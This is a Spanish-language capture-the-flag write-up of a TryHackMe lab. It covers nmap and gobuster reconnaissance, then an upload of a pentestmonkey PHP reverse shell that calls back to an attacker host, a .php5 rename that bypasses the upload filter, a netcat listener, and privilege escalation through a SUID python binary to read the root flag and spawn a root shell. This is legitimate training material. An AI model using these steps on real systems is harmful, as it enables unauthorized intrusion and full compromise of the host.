Bievenidos a otra sala de TryHackMe. Realizamos nuestro escaneo para averiguar puertos abiertos, descubrimos directorios ocultos con gobuster y cargamos nues shell con una ligera modificacion para luego escalar privilegios abusandonos del permiso python.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-03 06:08:54 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Al navegar al servidor web vemos nada mas que un mensaje y mucho no se puede hacer. Realizaremos una busqueda a directorio ocultos con nuestra herramienta gobuster.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/03 06:09:27 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
=====================================================
2023/07/03 06:17:20 Finished
====================================================
```

Ya tenemos dos directorios que podemo usar para generar una reverse shell en nuestra maquina atacante, los directorios que vamos a utilizar son /panel y /uploads.

# Intrusion

Navegamos al directorio /panel, donde el servidor web nos indica que podemos cargar archivos desde nuestro sistema. En este caso lo mejor es cargar una reverse shell, que yo utilizo php de pentestmonkey:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'LHOST'; 
$port = LPORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

# El codigo sigue, lo corte para no ocupar mucho espacio

```



Al cargar nuestro archivo, nos tira un error de que el servidor web no admite archivos php. En este caso, podemos renombrar la shell con algo muy simple para que el servidor web pueda admitirlo.

```bash
mv shell.php shell.php5
```

De esta forma, podemos cargar nuestra shell. Nos pondemos en escucha con el puerto que le indicamos a nuestro shell y nos dirigimos al directorio /uploads, donde veremos nuestro shell cargado. Lo seleccionamos y obtenemos una respuesta exitosa en nuestra maquina atacante.

```bash
nc -nvlp LPORT

# Nos dirigimos al direcotior /uploads

http://IPTARGET/uploads

# Seleccionamos nuestra shell

http://IPTARGET/uploads/shell.php
```

# Priv.Escalation

Enumeramos permisos elevados dentro del sistema

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Escalamos privilegios abusando del permiso **python**.
Podremos obtener una shell interactiva con usuario raiz root, o bien leer el contenido de algun archivo especifico que querramos descubrir.

```bash
python -c 'print(open("/root/root.txt").read())'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Esta informacion esta disponible en https://gtfobins.github.io/gtfobins/python/